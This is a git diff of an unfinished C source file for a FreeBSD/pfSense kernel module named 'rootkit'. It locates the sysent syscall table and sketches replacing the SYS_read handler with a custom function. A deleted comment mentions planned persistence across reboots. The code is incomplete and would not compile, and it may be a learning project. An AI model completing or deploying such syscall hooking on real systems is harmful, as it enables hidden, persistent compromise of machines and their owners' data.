@@ -1,45 +1,55 @@
-// These files will need to be within the environment that you compile this code 
-// but not within the environment that you execute that compiled file in. 
+// To keep this file relativly clean all non-essential notes can be referecned by number in an additional file named "lkm_notes.txt"
 
+// See 1.
 
-
-// Necessary headers 
-
-// Contains basic system parameters and macros used throughout the kernel.
+// Necessary headers, See 2. 
 #include <sys/param.h>
-
-// Provides the DECLARE_MODULE macro for registering the module.
 #include <sys/kernel.h>
-
-// Contains struct module and functions to manage loadable kernel modules (LKMs).
-// Defines constants like MOD_LOAD and MOD_UNLOAD for module lifecycle management.
 #include <sys/module.h>
-
-// We can't use <stdio> in kernel level application but this allows for uprintf
 #include <sys/systm.h>
-
-// Declares the sysent structure (syscall table), which holds syscall entries.
 #include <sys/sysent.h>
-
-// ???
+#include <sys/syscall.h>
 #include <sys/proc.h>
-
-// ???
 #include <sys/sysproto.h>
+#include <sys/types.h>
 
 
-// sysent is the syscall table in freebsd/pfsense, is it an imported variable and a structure
-// This is a pointer to the syscall table in memory
+// This is a pointer to the syscall table in memory, See 3.
 static struct sysent *syscall_table;
 
-// See if we can easily find the sysent table and point to it
+
+
+
+// All
+// New
+// Handlers
+// Go
+// Here
+
+static struct sysent new_read_handler = {
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+// Find the memory address of the sysent table and point to our handlers if found.
 static int find_sysent_table (void) {
 
-    // The sysent table should be global in freeBSD/pfSense
-    // Changing syscall_table will not change the memory addresses within the global sysent array
-    syscall_table = sysent;
-    if (syscall_table) {
-        uprintf("Table found at address: %p\n", syscall_table);
+    // Store memory address of sysent table, See 4.
+    old_syscall_table = sysent[SYS_read];
+
+    if (old_syscall_table) {
+        uprintf("Table found at address: %p\n", old_syscall_table);
+        change_sysent_addresses(); //add args
         return 0;
     }
     else {
@@ -51,13 +61,27 @@ static int find_sysent_table (void) {
 
 
 
+static int change_sysent_addresses (//arguments) {
+    // Replace SYS_read with a custom handler
+    // sysent[SYS_read] is a pointer to SYS_read in the sysent array
+    // sysent[SYS_read] = custom_syscall; 
+    // sysent[SYS_read].sy_call = (sy_call_t *)custom_read; // Replace
+}
 
 
-// default should implement some kind of persistance method.  
-//Ideally it will somehow recreate the rootkit binary and re-load it upon the machine starting back up.
 
-// Module event handler <rootkit_handler>
-// Handles load/unload requests from kldload and kldunload.
+
+
+
+
+
+
+
+
+
+
+
+// Create a handler for the LKM, See 5.
 static int rootkit_handler(struct module *module, int event, void *arg) {
 
     // This is the result of looking for the memory address of the sysent table, it will be 0 if successfull and anything else for other cases
@@ -78,14 +102,19 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     default:
         return EOPNOTSUPP;  // Unsupported operation
     }
-    // Returning 0 indicates successful execution of the handler.
-    // A non-zero value would indicate failure and stop the module from loading/unloading.
     return 0;
 }
 
 
-// Module metadata and registration
-// This struct registers the module with the kernel, linking the name (rootkit) with the handler.
+
+
+
+
+
+
+
+
+// Module metadata and registration, See 6.
 static moduledata_t rootkit_mod = {
     "rootkit",              // Module name
     rootkit_handler,        // Event handler
@@ -93,8 +122,5 @@ static moduledata_t rootkit_mod = {
 };
 
 
-// Register the module
-// What does it do???
-// Module name, metadata struct, subsustem level the module will be loaded at, order in which the module is loaded 
-// "rootkit", <rootkit_mod>, initialized at the driver subsystem level, will be loaded after critical drivers but before less important ones 
+// Register the module, See 7.
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
